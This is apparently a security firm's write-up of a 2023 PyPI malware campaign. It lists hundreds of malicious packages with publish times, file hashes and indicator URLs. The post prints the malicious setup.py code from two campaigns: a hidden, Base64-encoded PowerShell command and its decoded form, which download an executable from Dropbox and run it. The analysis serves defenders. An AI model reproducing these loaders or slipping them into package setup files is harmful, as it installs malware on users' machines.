
On the morning of February 23, 2023, Phylum’s automated risk detection platform started lighting up with another series of strange publications on PyPI. After digging into it, we were able to link it up to another smaller campaign from January of 2023.
The Scope
First, we can confirm that this is an ongoing attack. As we worked on this write up we saw the list of packages published go from a few dozen to over 500! The most recent packages appear to be getting published at around one every 4-8 seconds so we suspect this may continue for some time. You can look at the Package Publication section at the bottom of this post to see the packages we’ve seen (as of the publication of this post we’ve already seen 520 1,138 5,943 packages published) and their publication dates.
This doesn’t appear to be a typosquatting attack so we are currently unsure what significance the names of the packages serve.
Despite the huge number of packages, thankfully we expect the fallout from this attack to be relatively small because of PyPI’s extremely quick takedown response.
The Maliciousness
This maliciousness is contained in the setup.py file and contains the following snippet:
if not os.path.exists('tahg'):
    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
except: pass
The -EncodedCommand flag passed to the Powershell command should catch your attention. It allows the attacker to execute a Powershell command that has been Base64-Encoded. This is obviously a simple obfuscation attempt to hide the attacker’s intention. Decoded, the string resolves to:
powershell Invoke-WebRequest -Uri "https://dl.dropbox.com/s/szgnyt9zbub0qmv/Esquele.exe?dl=0" -OutFile "~/WindowsCache.exe"; Invoke-Expression "~/WindowsCache.exe"
It downloads a remote executable from a Dropbox link and saves it locally to a file called “WindowsCache.exe” and then tries to directly execute that file with the Invoke-Expression command.
The executable Esquele.exe is a stage 1 dropper written in Rust. The second stage is Python compiled with Nuikta. Running the second stage will drop a handful of binaries to disk. Each of these has been identified as malware.
Esquele.exe (Stage 1)          8ab8ddfa3f61334cf9386b62aea3a761852b3d785d9f21b8a638cc42b0af7afd
Vanguard Tray Notification.exe 8713178131b9c12b07a5c702b6119be4d314bc216aed574ac4a8cd6d7b7fe063
NvidiaLTD.exe                 8713178131b9c12b07a5c702b6119be4d314bc216aed574ac4a8cd6d7b7fe063
Update.vbs                     bdef8d97c8590d4b655fa350e3a0a6f07f34dcd153ed60c0d2edf864a97012d3
Intel Graphics.exe             8713178131b9c12b07a5c702b6119be4d314bc216aed574ac4a8cd6d7b7fe063
9787.exe                       9738bc959696164a4a55e5ebf185de7d8e1cf37f1cd982cbe95d8f2a6662d3c8
4448.exe                       e63facb4fc6afd61d4fe681481c4528424930f46bd53ba2555c498943e569063
Additionally, we should note the following IOCs:
https://dl.dropbox[.]com/s/szgnyt9zbub0qmv/Esquele.exe
https://dl.dropbox[.]com/s/safqez76opk5ass/EsqueleStealer.exe
This is Probably Not Their First Attack on PyPI
We suspect the actors behind this attack are the same ones behind an attack in January of 2023 where we saw the publication of httpslib, colorslib, and libhttps. In these libraries the attacker used a very similar snippet in the setup.py file:
try:
  import os
  try:
    import subprocess
  except:
    os.system("pip install subprocess||python -m pip install subprocess")
    import subprocess
  creationflags = subprocess.CREATE_NO_WINDOW
  subprocess.run('powershell Invoke-WebRequest -Uri "https://dl.dropbox.com/s/mkd3enun97s8zag/Oxzy.exe?dl=0" -OutFile "~/WindowsCache.exe"; Invoke-Expression "~/WindowsCache.exe"')
As we can see in these attacks, there’s the similar Powershell commands, the dropbox link and the renaming of the executable to “WindowsCache.exe”.
As an aside, in January we also discovered the publication of fredmi, fredli, frekpy, and derkpy. These were released in the days leading up to the publications of httpslib, colorslib, and libhttps and appear to be practice and experimentation releases to test and/or hone their final code.
The Package Publication Timeline List
libmine@4.15 - Publish Time: 2023-02-23 09:01:39
cpuget@3.9 - Publish Time: 2023-02-23 09:01:45
guiultra@3.54 - Publish Time: 2023-02-23 09:01:48
guire@9.82 - Publish Time: 2023-02-23 09:01:51
getgame@2.65 - Publish Time: 2023-02-23 09:01:54
mcsuper@8.33 - Publish Time: 2023-02-23 09:02:00
cpuurl@6.86 - Publish Time: 2023-02-23 09:02:03
getgrand@2.7 - Publish Time: 2023-02-23 09:02:06
vmload@7.1 - Publish Time: 2023-02-23 09:02:10
adcpu@5.94 - Publish Time: 2023-02-23 09:02:13
httppip@2.5 - Publish Time: 2023-02-23 09:02:16
mcgame@6.78 - Publish Time: 2023-02-23 09:02:19
postload@5.53 - Publish Time: 2023-02-23 09:02:22
infocpu@10.31 - Publish Time: 2023-02-23 09:02:25
reget@6.82 - Publish Time: 2023-02-23 09:02:29
candypyw@8.5 - Publish Time: 2023-02-23 09:02:32
urlgrand@7.98 - Publish Time: 2023-02-23 09:02:36
toolgame@5.11 - Publish Time: 2023-02-23 09:02:39
piplib@10.66 - Publish Time: 2023-02-23 09:02:42
toolpyw@8.37 - Publish Time: 2023-02-23 09:02:45
toolre@6.1 - Publish Time: 2023-02-23 09:02:48
urlgrand@2.74 - Publish Time: 2023-02-23 09:02:52
pywurl@5.6 - Publish Time: 2023-02-23 09:02:55
minegui@2.33 - Publish Time: 2023-02-23 09:03:01
libultra@10.1 - Publish Time: 2023-02-23 09:03:04
pipurl@1.7 - Publish Time: 2023-02-23 09:03:07
regame@8.23 - Publish Time: 2023-02-23 09:03:10
posthttp@1.73 - Publish Time: 2023-02-23 09:03:14
mcgame@1.85 - Publish Time: 2023-02-23 09:03:17
pipultra@9.37 - Publish Time: 2023-02-23 09:03:20
minetool@1.18 - Publish Time: 2023-02-23 09:03:23
libpost@2.63 - Publish Time: 2023-02-23 09:03:26
adgrand@6.67 - Publish Time: 2023-02-23 09:03:30
mcultra@4.16 - Publish Time: 2023-02-23 09:03:33
minesuper@9.58 - Publish Time: 2023-02-23 09:03:37
cpugui@9.93 - Publish Time: 2023-02-23 09:03:40
repip@5.32 - Publish Time: 2023-02-23 09:03:43
pipgame@5.57 - Publish Time: 2023-02-23 09:03:46
vmgui@10.24 - Publish Time: 2023-02-23 09:03:50
piplib@1.8 - Publish Time: 2023-02-23 09:03:56
mcad@7.41 - Publish Time: 2023-02-23 09:03:59
toolmine@4.58 - Publish Time: 2023-02-23 11:22:16
getpost@8.7 - Publish Time: 2023-02-23 11:22:20
urlmine@7.27 - Publish Time: 2023-02-23 11:22:24
getgui@1.41 - Publish Time: 2023-02-23 11:22:28
guipyw@10.93 - Publish Time: 2023-02-23 11:22:31
mineultra@9.35 - Publish Time: 2023-02-23 11:22:37
craftmc@7.1 - Publish Time: 2023-02-23 11:22:40
toolgrand@1.6 - Publish Time: 2023-02-23 11:22:44
vmgame@8.93 - Publish Time: 2023-02-23 11:22:49
pywgame@3.52 - Publish Time: 2023-02-23 11:22:52
vmhttp@9.67 - Publish Time: 2023-02-23 11:22:58
postpyw@8.81 - Publish Time: 2023-02-23 11:23:01
libram@3.94 - Publish Time: 2023-02-23 11:23:05
ultramc@1.7 - Publish Time: 2023-02-23 11:23:08
guigrand@7.56 - Publish Time: 2023-02-23 13:30:04
postlib@4.8 - Publish Time: 2023-02-23 13:30:09
pyultra@1.7 - Publish Time: 2023-02-23 13:30:17
adpost@4.68 - Publish Time: 2023-02-23 13:30:20
grandlib@7.71 - Publish Time: 2023-02-23 13:30:23
crafturl@4.1 - Publish Time: 2023-02-23 13:30:27
urlurl@10.31 - Publish Time: 2023-02-23 13:30:30
getget@8.24 - Publish Time: 2023-02-23 13:30:33
piptool@4.84 - Publish Time: 2023-02-23 13:30:41
getlib@2.86 - Publish Time: 2023-02-23 13:30:44
toolurl@10.55 - Publish Time: 2023-02-23 13:30:50
cpugrand@3.77 - Publish Time: 2023-02-23 13:30:55
urlcandy@8.94 - Publish Time: 2023-02-23 13:30:58
minepip@9.59 - Publish Time: 2023-02-23 13:31:04
pipcpu@10.81 - Publish Time: 2023-02-23 13:31:08
urlpost@6.61 - Publish Time: 2023-02-23 13:31:14
adpost@3.63 - Publish Time: 2023-02-23 13:31:18
vmram@1.35 - Publish Time: 2023-02-23 13:31:22
httptool@4.14 - Publish Time: 2023-02-23 13:31:25
pywgui@6.32 - Publish Time: 2023-02-23 13:31:28
mineurl@1.38 - Publish Time: 2023-02-23 13:31:32
httpgrand@9.18 - Publish Time: 2023-02-23 13:31:35
loadcandy@4.1 - Publish Time: 2023-02-23 13:31:38
libad@2.22 - Publish Time: 2023-02-23 13:31:41
crafthttp@2.99 - Publish Time: 2023-02-23 13:31:45
urlcraft@5.32 - Publish Time: 2023-02-23 13:31:48
urlpip@8.26 - Publish Time: 2023-02-23 13:31:52
cpuram@5.7 - Publish Time: 2023-02-23 13:31:55
grandcraft@5.8 - Publish Time: 2023-02-23 13:31:58
cpugrand@7.35 - Publish Time: 2023-02-23 13:32:02
urlpyw@9.52 - Publish Time: 2023-02-23 13:32:05
getgui@10.52 - Publish Time: 2023-02-23 13:32:09
guihttp@8.72 - Publish Time: 2023-02-23 13:32:13
advm@5.54 - Publish Time: 2023-02-23 13:32:16
grandhttp@5.74 - Publish Time: 2023-02-23 13:32:21
vmpost@1.3 - Publish Time: 2023-02-23 13:32:29
repyw@6.3 - Publish Time: 2023-02-23 13:32:32
httpload@10.7 - Publish Time: 2023-02-23 13:32:36
gamepyw@3.99 - Publish Time: 2023-02-23 13:32:39
superget@4.21 - Publish Time: 2023-02-23 13:32:43
infopip@1.75 - Publish Time: 2023-02-23 13:32:46
ultraram@6.68 - Publish Time: 2023-02-23 13:32:49
rampyw@9.34 - Publish Time: 2023-02-23 13:32:52
rammc@6.61 - Publish Time: 2023-02-23 13:32:55
getvm@7.94 - Publish Time: 2023-02-23 13:32:58
loadsuper@6.27 - Publish Time: 2023-02-23 13:33:02
rampip@5.44 - Publish Time: 2023-02-23 13:33:09
toolgrand@10.39 - Publish Time: 2023-02-23 13:33:12
craftcandy@1.64 - Publish Time: 2023-02-23 13:33:15
postpyw@5.28 - Publish Time: 2023-02-23 13:33:19
candygame@10.61 - Publish Time: 2023-02-23 13:33:22
urlpost@5.34 - Publish Time: 2023-02-23 13:33:25
craftgrand@4.35 - Publish Time: 2023-02-23 13:33:33
reinfo@8.9 - Publish Time: 2023-02-23 13:33:37
vmsuper@2.28 - Publish Time: 2023-02-23 13:33:40
craftgame@9.89 - Publish Time: 2023-02-23 13:33:44
candyget@6.98 - Publish Time: 2023-02-23 13:33:52
loadmc@6.96 - Publish Time: 2023-02-23 13:33:57
infocandy@6.95 - Publish Time: 2023-02-23 13:34:03
httptool@4.2 - Publish Time: 2023-02-23 13:34:06
pywram@2.39 - Publish Time: 2023-02-23 13:34:11
grandultra@5.8 - Publish Time: 2023-02-23 13:34:20
vmram@1.66 - Publish Time: 2023-02-23 13:34:27
getad@4.56 - Publish Time: 2023-02-23 13:34:32
urlload@10.4 - Publish Time: 2023-02-23 13:34:35
grandpyw@10.64 - Publish Time: 2023-02-23 13:34:39
adpip@3.22 - Publish Time: 2023-02-23 13:34:47
toolget@5.24 - Publish Time: 2023-02-23 13:34:55
getram@9.84 - Publish Time: 2023-02-23 13:34:58
vmvm@9.72 - Publish Time: 2023-02-23 13:35:04
grandgrand@8.43 - Publish Time: 2023-02-23 13:35:10
pywcpu@10.59 - Publish Time: 2023-02-23 13:35:15
cpucraft@9.5 - Publish Time: 2023-02-23 13:35:25
grandvm@3.12 - Publish Time: 2023-02-23 13:35:33
infoinfo@3.26 - Publish Time: 2023-02-23 13:35:36
mccraft@3.59 - Publish Time: 2023-02-23 13:35:39
vmtool@2.54 - Publish Time: 2023-02-23 13:35:47
grandtool@2.33 - Publish Time: 2023-02-23 13:35:50
ramget@7.73 - Publish Time: 2023-02-23 13:35:56
adcraft@3.12 - Publish Time: 2023-02-23 13:35:59
candygui@7.67 - Publish Time: 2023-02-23 13:36:03
rampip@3.67 - Publish Time: 2023-02-23 13:36:10
libcandy@5.6 - Publish Time: 2023-02-23 13:36:13
grandultra@9.83 - Publish Time: 2023-02-23 13:36:20
ultravm@8.31 - Publish Time: 2023-02-23 13:36:27
rammc@8.7 - Publish Time: 2023-02-23 13:36:31
getlib@9.46 - Publish Time: 2023-02-23 13:36:34
urlad@2.86 - Publish Time: 2023-02-23 13:36:37
loadpyw@10.71 - Publish Time: 2023-02-23 13:36:45
superad@10.8 - Publish Time: 2023-02-23 13:36:51
postsuper@6.37 - Publish Time: 2023-02-23 13:36:56
getcraft@8.73 - Publish Time: 2023-02-23 13:37:00
reinfo@10.57 - Publish Time: 2023-02-23 13:37:04
cpuultra@4.7 - Publish Time: 2023-02-23 13:37:08
loadre@3.44 - Publish Time: 2023-02-23 13:37:12
supervm@4.41 - Publish Time: 2023-02-23 13:37:15
adpyw@1.56 - Publish Time: 2023-02-23 13:37:18
infoget@6.39 - Publish Time: 2023-02-23 13:37:22
toolad@2.28 - Publish Time: 2023-02-23 13:37:25
admc@7.87 - Publish Time: 2023-02-23 13:37:31
getultra@5.29 - Publish Time: 2023-02-23 13:37:35
infoload@1.66 - Publish Time: 2023-02-23 13:37:40
getpip@5.37 - Publish Time: 2023-02-23 13:37:44
toolsuper@4.75 - Publish Time: 2023-02-23 13:37:47
adgui@3.67 - Publish Time: 2023-02-23 13:37:50
adcandy@10.49 - Publish Time: 2023-02-23 13:37:54
superlib@4.7 - Publish Time: 2023-02-23 13:37:59
pipcandy@5.94 - Publish Time: 2023-02-23 13:38:03
pipad@2.19 - Publish Time: 2023-02-23 13:38:06
regrand@2.61 - Publish Time: 2023-02-23 13:38:13
candygame@7.59 - Publish Time: 2023-02-23 13:38:16
supercandy@8.98 - Publish Time: 2023-02-23 13:38:19
urlmc@7.44 - Publish Time: 2023-02-23 13:38:23
gamepost@1.25 - Publish Time: 2023-02-23 13:38:27
gamecandy@6.66 - Publish Time: 2023-02-23 13:38:33
candymc@2.44 - Publish Time: 2023-02-23 13:38:40
adpost@8.47 - Publish Time: 2023-02-23 13:38:46
candyram@2.86 - Publish Time: 2023-02-23 13:38:55
crafttool@3.6 - Publish Time: 2023-02-23 13:39:04
infoget@9.24 - Publish Time: 2023-02-23 13:39:08
candyinfo@2.1 - Publish Time: 2023-02-23 13:39:13
ultrasuper@2.71 - Publish Time: 2023-02-23 13:39:17
adpyw@7.44 - Publish Time: 2023-02-23 13:39:20
pywpost@4.97 - Publish Time: 2023-02-23 13:39:29
httptool@1.91 - Publish Time: 2023-02-23 13:39:33
ramget@7.4 - Publish Time: 2023-02-23 13:39:37
ultraad@6.27 - Publish Time: 2023-02-23 13:39:40
crafturl@5.19 - Publish Time: 2023-02-23 13:39:43
gamegame@8.3 - Publish Time: 2023-02-23 13:39:59
cpupost@5.72 - Publish Time: 2023-02-23 13:40:03
infogui@1.17 - Publish Time: 2023-02-23 13:40:08
infosuper@8.71 - Publish Time: 2023-02-23 13:40:12
ramget@5.42 - Publish Time: 2023-02-23 13:40:15
libinfo@4.72 - Publish Time: 2023-02-23 13:40:21
supermine@5.37 - Publish Time: 2023-02-23 13:40:28
candyultra@4.3 - Publish Time: 2023-02-23 13:40:36
loadgrand@9.38 - Publish Time: 2023-02-23 13:40:40
adload@4.4 - Publish Time: 2023-02-23 13:40:43
candysuper@8.87 - Publish Time: 2023-02-23 13:40:46
posturl@4.67 - Publish Time: 2023-02-23 13:40:52
cpumine@6.42 - Publish Time: 2023-02-23 13:40:57
grandad@7.22 - Publish Time: 2023-02-23 13:41:01
ramurl@4.2 - Publish Time: 2023-02-23 13:41:04
guiget@8.5 - Publish Time: 2023-02-23 13:41:07
urlmine@4.97 - Publish Time: 2023-02-23 13:41:11
mchttp@8.69 - Publish Time: 2023-02-23 13:41:14
grandsuper@2.5 - Publish Time: 2023-02-23 13:41:22
rampost@10.91 - Publish Time: 2023-02-23 13:41:26
superpost@9.27 - Publish Time: 2023-02-23 13:41:30
ultrahttp@6.99 - Publish Time: 2023-02-23 13:41:33
grandinfo@6.2 - Publish Time: 2023-02-23 13:41:41
libgame@8.55 - Publish Time: 2023-02-23 13:41:45
infoget@5.78 - Publish Time: 2023-02-23 13:41:48
gameload@6.34 - Publish Time: 2023-02-23 13:41:52
gettool@5.65 - Publish Time: 2023-02-23 13:41:55
candyre@5.66 - Publish Time: 2023-02-23 13:41:58
pipcpu@2.75 - Publish Time: 2023-02-23 13:42:02
loadcandy@6.8 - Publish Time: 2023-02-23 13:42:05
mineurl@10.96 - Publish Time: 2023-02-23 13:42:10
pycandy@3.24 - Publish Time: 2023-02-23 13:42:13
candyram@5.3 - Publish Time: 2023-02-23 13:42:21
urlhttp@1.57 - Publish Time: 2023-02-23 13:42:25
urlsuper@5.29 - Publish Time: 2023-02-23 13:42:29
urlload@10.7 - Publish Time: 2023-02-23 13:42:36
mcpost@9.76 - Publish Time: 2023-02-23 13:42:42
recpu@9.28 - Publish Time: 2023-02-23 13:42:49
minead@3.42 - Publish Time: 2023-02-23 13:42:59
recpu@7.41 - Publish Time: 2023-02-23 13:43:05
postram@4.12 - Publish Time: 2023-02-23 13:43:09
httpmine@4.62 - Publish Time: 2023-02-23 13:43:13
craftgrand@7.98 - Publish Time: 2023-02-23 13:43:16
urlpost@2.9 - Publish Time: 2023-02-23 13:43:20
rampyw@7.91 - Publish Time: 2023-02-23 13:43:23
supercandy@8.52 - Publish Time: 2023-02-23 13:43:26
vmhttp@9.34 - Publish Time: 2023-02-23 13:43:30
ultrainfo@10.4 - Publish Time: 2023-02-23 13:43:34
grandsuper@8.13 - Publish Time: 2023-02-23 13:43:38
urlhttp@8.28 - Publish Time: 2023-02-23 13:43:42
httpgrand@5.91 - Publish Time: 2023-02-23 13:43:45
loadcandy@8.62 - Publish Time: 2023-02-23 13:43:49
cpuvm@8.5 - Publish Time: 2023-02-23 13:43:55
mineultra@1.77 - Publish Time: 2023-02-23 13:44:01
gamecandy@7.6 - Publish Time: 2023-02-23 13:44:04
ramgame@4.5 - Publish Time: 2023-02-23 13:44:08
ultracraft@5.96 - Publish Time: 2023-02-23 13:44:14
ramgui@2.68 - Publish Time: 2023-02-23 13:44:18
vmgame@10.82 - Publish Time: 2023-02-23 13:44:27
postget@1.38 - Publish Time: 2023-02-23 13:44:30
ramvm@7.82 - Publish Time: 2023-02-23 13:44:36
rammc@2.79 - Publish Time: 2023-02-23 13:44:42
ramre@10.89 - Publish Time: 2023-02-23 13:44:48
cpure@5.87 - Publish Time: 2023-02-23 13:44:51
crafthttp@7.28 - Publish Time: 2023-02-23 13:44:56
infomc@8.49 - Publish Time: 2023-02-23 13:45:02
ultrapip@6.25 - Publish Time: 2023-02-23 13:45:08
supermc@5.74 - Publish Time: 2023-02-23 13:45:11
craftload@7.2 - Publish Time: 2023-02-23 13:45:18
pipsuper@9.88 - Publish Time: 2023-02-23 13:45:21
loadvm@3.33 - Publish Time: 2023-02-23 13:45:28
ultracandy@1.52 - Publish Time: 2023-02-23 13:45:33
remine@4.34 - Publish Time: 2023-02-23 13:45:37
adhttp@2.51 - Publish Time: 2023-02-23 13:45:42
pipcraft@9.21 - Publish Time: 2023-02-23 13:45:48
